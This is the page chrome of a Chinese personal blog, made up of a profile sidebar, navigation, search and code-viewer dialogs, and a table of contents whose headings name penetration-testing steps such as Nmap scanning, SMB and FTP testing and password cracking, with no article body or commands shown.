md:pt-4 md:pl-3" data-type="post" data-default-type="directory"><div class="sider-slot" data-slot-type="info"><div class="flex flex-col items-center"><div class="h-40 w-40 rounded-full" style="background-image:linear-gradient(135deg, #9e8764 0%, #ae7b62 50%, #644235 100%)"><img class="shadow-card-darker hover:animate-shake h-full w-full rounded-full transition" src="/img/724d7fb480c8ac0db472ca5c7e36d239.jpg" alt="Kaguya avatar" loading="eager" fetchPriority="high"/></div><p class="mt-2">Kaguya</p><p class="text-muted-foreground mt-3 text-center">ACG / 养猫人 / 菜逼 / 黑客 / 臭美</p><div class="mt-2 grid grid-cols-3 gap-2"><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#191717" data-platform="github" href="https://github.com/XueHua-s" title="GitHub" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="GitHub"><i class="fa-brands fa-github social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#4b9ae4" data-platform="x" href="https://x.com/" title="X (推特)" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="X (推特)"><i class="fa-brands fa-x-twitter social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#55acd5" data-platform="email" href="mailto:xuehualjx@gmail.com" title="Email" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="Email"><i class="fa-regular fa-envelope social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div></div><div class="text-muted-foreground mt-3 flex justify-center text-center text-sm/4 whitespace-nowrap select-none dark:text-white/80"><a href="/blog" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">11</span>文章</a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/categories" aria-label="分类" class="hover:text-blue"><p class="flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">4</span>分类</p></a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/tags" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">8</span>标签</a></div><div class="mt-6 flex w-full flex-col items-center gap-2.5"><a href="/blog" aria-label="首页" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-house-chimney" aria-hidden="true"></i>首页</a><div class="bg-foreground/10 flex w-40 flex-col rounded-xl opacity-75 transition-all duration-300 hover:opacity-100" data-collapsible="true"><button class="flex-center hover:bg-foreground/5 h-12 w-full cursor-pointer rounded-xl transition-colors" aria-expanded="false" aria-controls="_r15R_a_-collapse-1" aria-label="文章菜单" type="button"><i class="mr-1.5 fa-solid fa-pen-nib" aria-hidden="true"></i>文章<i class="fa-solid fa-caret-down ml-2 text-base transition-transform duration-300" aria-hidden="true"></i></button><div id="_r15R_a_-collapse-1" class="collapse-content collapse-hidden" data-collapse-content="true"><div class="flex flex-col items-center"><a href="/blog/categories" aria-label="分类" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-layer-group" aria-hidden="true"></i>分类</a><a href="/blog/tags" aria-label="标签" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-tags" aria-hidden="true"></i>标签</a></div></div></div><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-regular fa-circle-user" aria-hidden="true"></i>关于</a></div></div></div><div class="sider-slot hidden" data-slot-type="directory"><nav class="toc-container max-h-[90dvh] overflow-auto " aria-label="文章目录"><div class="space-y-1 pr-2"><div class="heading-tree-item relative"><a href="#nmap基本扫描" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Nmap基本扫描"><span class="heading-text block flex-1 truncate leading-relaxed">Nmap基本扫描</span></a></div><div class="heading-tree-item relative"><a href="#针对端口指纹和漏洞的扫描" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对端口指纹和漏洞的扫描"><span class="heading-text block flex-1 truncate leading-relaxed">针对端口指纹和漏洞的扫描</span></a></div><div class="heading-tree-item relative"><a href="#针对-web-端口的枚举" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 web 端口的枚举"><span class="heading-text block flex-1 truncate leading-relaxed">针对 web 端口的枚举</span></a></div><div class="heading-tree-item relative"><a href="#针对已知的服务进行攻击尝试搜索漏洞信息" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对已知的服务进行攻击尝试，搜索漏洞信息"><span class="heading-text block flex-1 truncate leading-relaxed">针对已知的服务进行攻击尝试，搜索漏洞信息</span></a></div><div class="heading-tree-item relative"><a href="#针对-web-页面的测试" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 web 页面的测试"><span class="heading-text block flex-1 truncate leading-relaxed">针对 web 页面的测试</span></a></div><div class="heading-tree-item relative"><a href="#针对-netbiossmbrpc-端口的测试" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 NETBIOS、SMB、RPC 端口的测试"><span class="heading-text block flex-1 truncate leading-relaxed">针对 NETBIOS、SMB、RPC 端口的测试</span></a></div><div class="heading-tree-item relative"><a href="#针对-smtp-端口的尝试" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 SMTP 端口的尝试"><span class="heading-text block flex-1 truncate leading-relaxed">针对 SMTP 端口的尝试</span></a></div><div class="heading-tree-item relative"><a href="#针对-snmp-端口的测试" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 SNMP 端口的测试"><span class="heading-text block flex-1 truncate leading-relaxed">针对 SNMP 端口的测试</span></a></div><div class="heading-tree-item relative"><a href="#针对-ftp-端口测试" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 FTP 端口测试"><span class="heading-text block flex-1 truncate leading-relaxed">针对 FTP 端口测试</span></a></div><div class="heading-tree-item relative"><a href="#密码破解" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="密码破解"><span class="heading-text block flex-1 truncate leading-relaxed">密码破解</span></a></div><div class="heading-tree-item relative"><a href="#数据包抓取" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="数据包抓取"><span class="heading-text block flex-1 truncate leading-relaxed">数据包抓取</span></a></div><div class="heading-tree-item relative"><a href="#参考资料" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="参考资料"><span class="heading-text block flex-1 truncate leading-relaxed">参考资料</span></a></div></div></nav></div><div class="sider-slot hidden" data-slot-type="series"><div class="flex flex-col gap-1"><a href="/blog/post/11" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50 text-primary font-medium"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-primary"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-primary">Common process for handling objectives</span></a><a href="/blog/post/10" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Mandatory manual</span></a></div></div></div><div class="border-border mt-4 flex flex-col gap-3 border-t pt-4 md:mt-0 md:pt-2 w-full px-2"><div class="flex items-center justify-between gap-2"><div class="max-w-[45%] flex-1"></div><a href="/blog/post/10" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1 justify-end text-right" title="Mandatory manual"><span class="truncate text-xs">Mandatory manual</span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path></svg></a></div><div class="flex justify-center gap-2"><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="回到顶部" aria-label="回到顶部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 10.8284L7.0502 15.7782L5.63599 14.364L11.9999 8L18.3639 14.364L16.9497 15.7782L11.9999 10.8284Z"></path></svg>回到顶部</button><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="滚到底部" aria-label="滚到底部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 13.1714L16.9497 8.22168L18.3639 9.63589L11.9999 15.9999L5.63599 9.63589L7.0502 8.22168L11.9999 13.1714Z"></path></svg>滚到底部</button></div></div><div class="mt-auto w-full rounded-full pt-4 sticky bottom-0"><div class="bg-primary h-1 origin-left rounded-full scale-x-0"></div></div><!--astro:end--></astro-island> </div> </astro-slot></div></div><!--astro:end--></astro-island> <!-- 遮罩层 --><div id="search-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/50 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- 搜索对话框 --> <div id="search-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="搜索文章" aria-modal="true"> <div id="search-dialog-content" class="bg-gradient-start shadow-box w-full max-w-3xl overflow-auto rounded-xl opacity-0 transition-all duration-200"> <div class="relative p-6 md:p-3"> <div class="search-dialog"> <!-- Header --> <div class="relative mb-4 flex items-center justify-between"> <h2 class="flex items-center gap-2 text-lg font-semibold md:text-base"> <i class="fa-solid fa-magnifying-glass text-base md:text-sm" aria-hidden="true"></i>
搜索文章
</h2> <button id="search-dialog-close" class="flex size-8 items-center justify-center rounded-full bg-black/5 transition-colors duration-300 hover:bg-black/10 md:size-7 dark:bg-white/10 dark:hover:bg-white/20" aria-label="关闭搜索"> <i class="fa-solid fa-xmark text-base md:text-sm" aria-hidden="true"></i> </button> </div> <div id="search-empty-hint" class="search-empty-hint absolute inset-x-0 top-32 text-center text-sm opacity-60 md:top-28"> <p>输入关键词搜索博客文章</p> <p class="mt-1 text-xs">
按 <kbd class="rounded bg-black/10 px-1.5 py-0.5 font-mono dark:bg-white/10">ESC</kbd> 关闭
</p> </div> <!-- Search Content Area --> <div class="vertical-scrollbar scroll-feather-mask -mx-6 h-[calc(80dvh-140px)] overflow-auto scroll-smooth px-6 pb-10 md:-mx-3 md:h-[calc(80dvh-120px)] md:px-3"> <!-- Search Container --> <div id="search-dialog-container"></div> </div> </div> <!-- Keyboard hints --> <div class="bg-background/2 absolute inset-x-0 bottom-0 z-10 flex items-center justify-center gap-4 px-4 pt-2 pb-4 text-xs text-black/50 dark:border-white/10 dark:text-white/50"> <span><kbd class="kbd">↑↓</kbd> 选择</span> <span><kbd class="kbd">Enter</kbd> 打开</span> <span><kbd class="kbd">ESC</kbd> 关闭</span> </div> </div> </div> </div> <script type="module" src="/_astro/SearchDialog.astro_astro_type_script_index_0_lang.B0CSJxN3.js"></script>  <!-- 遮罩层 --><div id="code-fullscreen-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/80 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- 代码全屏对话框 --> <div id="code-fullscreen-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="代码全屏预览" aria-modal="true"> <div id="code-fullscreen-content" class="bg-background relative flex h-[85vh] w-[90vw] max-w-6xl flex-col overflow-hidden rounded-xl opacity-0 shadow-2xl transition-opacity duration-200 md:max-w-[90vw]"> <!-- Toolbar --> <div class="border-border bg-muted/50 flex shrink-0 items-center justify-between border-b px-4 py-3 backdrop-blur-sm"> <div class="flex items-center gap-3"> <div class="flex gap-2"> <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span> <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span> <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span> </div> <span id="code-fullscreen-language" class="text-muted-foreground font-mono text-xs font-medium tracking-wider uppercase">
text
</span> </div> <div class="flex items-center gap-1"> <button id="code-fullscreen-copy" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors"> <!-- Copy icon --> <svg id="code-fullscreen-copy-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 448 512" fill="currentColor"> <path d="M192 0c-35.3 0-64 28.7-64 64l0 256c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-200.6c0-17.4-7.1-34.1-19.7-46.2L370.6 17.8C358.7 6.4 342.8 0 326.3 0L192 0zM64 128c-35.3 0-64 28.7-64 64L0 448c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-16-64 0 0 16-192 0 0-256 16 0 0-64-16 0z"></path> </svg> <!-- Checkmark icon (hidden by default) --> <svg id="code-fullscreen-check-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="hidden"> <mask id="checkmark-anim-fullscreen"> <g fill="none" stroke="#fff" stroke-dasharray="24" stroke-dashoffset="24" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"> <path d="M2 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" dur="0.4s" values="24;0"></animate> </path> <path stroke="#000" stroke-width="6" d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> <path d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> </g> </mask> <rect width="24" height="24" fill="currentColor" mask="url(#checkmark-anim-fullscreen)"></rect> </svg> <span id="code-fullscreen-copy-text" class="text-sm">复制</span> </button> <button id="code-fullscreen-close" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground rounded-md p-2 transition-colors" aria-label="关闭"> <i class="fa-solid fa-xmark text-base" aria-hidden="true"></i> </button> </div> </div> <!-- Code Content --> <div class="scroll-feather-mask flex-1 overflow-auto"> <pre id="code-fullscreen-pre" class="p-4"><code id="code-fullscreen-code"></code></pre> </div> </div> </div> <script type="module" src="/_astro/CodeBlockFullscreen.astro_astro_type_script_index_0_lang.BUCnEfx7.js"></script> <!-- Overlay --><div id="mermaid-fullscreen-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/80 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- Mermaid Fullscreen Dialog --> <div id="mermaid-fullscreen-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="Mermaid diagram fullscreen" aria-modal="true"> <div id="mermaid-fullscreen-content" class="bg-background relative flex h-[85vh] w-[90vw] max-w-6xl flex-col overflow-hidden rounded-xl opacity-0 shadow-2xl transition-opacity duration-200 md:max-w-[90vw]"> <!-- Toolbar --> <div class="border-border bg-muted/50 flex shrink-0 items-center justify-between border-b px-4 py-3 backdrop-blur-sm"> <div class="flex items-center gap-3"> <div class="flex gap-2"> <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span> <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span> <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span> </div> <span class="text-muted-foreground font-mono text-xs font-medium tracking-wider uppercase"> mermaid </span> </div> <div class="flex items-center gap-1"> <!-- Zoom info --> <span id="mermaid-zoom-level" class="text-muted-foreground mr-2 text-sm">100%</span> <!-- Reset zoom button --> <button id="mermaid-fullscreen-reset" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors" title="Reset zoom"> <i class="fa-solid fa-rotate-right text-sm" aria-hidden="true"></i> </button> <!-- Copy button --> <button id="mermaid-fullscreen-copy" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors"> <svg id="mermaid-fullscreen-copy-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 448 512" fill="currentColor"> <path d="M192 0c-35.3 0-64 28.7-64 64l0 256c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-200.6c0-17.4-7.1-34.1-19.7-46.2L370.6 17.8C358.7 6.4 342.8 0 326.3 0L192 0zM64 128c-35.3 0-64 28.7-64 64L0 448c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-16-64 0 0 16-192 0 0-256 16 0 0-64-16 0z"></path> </svg> <svg id="mermaid-fullscreen-check-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="hidden"> <mask id="checkmark-anim-mermaid-fullscreen"> <g fill="none" stroke="#fff" stroke-dasharray="24" stroke-dashoffset="24" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"> <path d="M2 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" dur="0.4s" values="24;0"></animate> </path> <path stroke="#000" stroke-width="6" d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> <path d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> </g> </mask> <rect width="24" height="24" fill="currentColor" mask="url(#checkmark-anim-mermaid-fullscreen)"></rect> </svg> <span id="mermaid-fullscreen-copy-text" class="text-sm">Copy</span> </button> <!-- Close button --> <button id="mermaid-fullscreen-close" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground rounded-md p-2 transition-colors" aria-label="Close"> <i class="fa-solid fa-xmark text-base" aria-hidden="true"></i> </button> </div> </div> <!-- SVG Container with zoom/pan --> <div id="mermaid-fullscreen-viewport" class="flex flex-1 cursor-grab items-center justify-center overflow-hidden active:cursor-grabbing"> <div id="mermaid-fullscreen-svg" class="mermaid-svg-container origin-center transition-transform duration-100"></div> </div> </div> </div> <script type="module" src="/_astro/MermaidFullscreen.astro_astro_type_script_index_0_lang.DIkgBJYA.js"></script> </div> </body></html>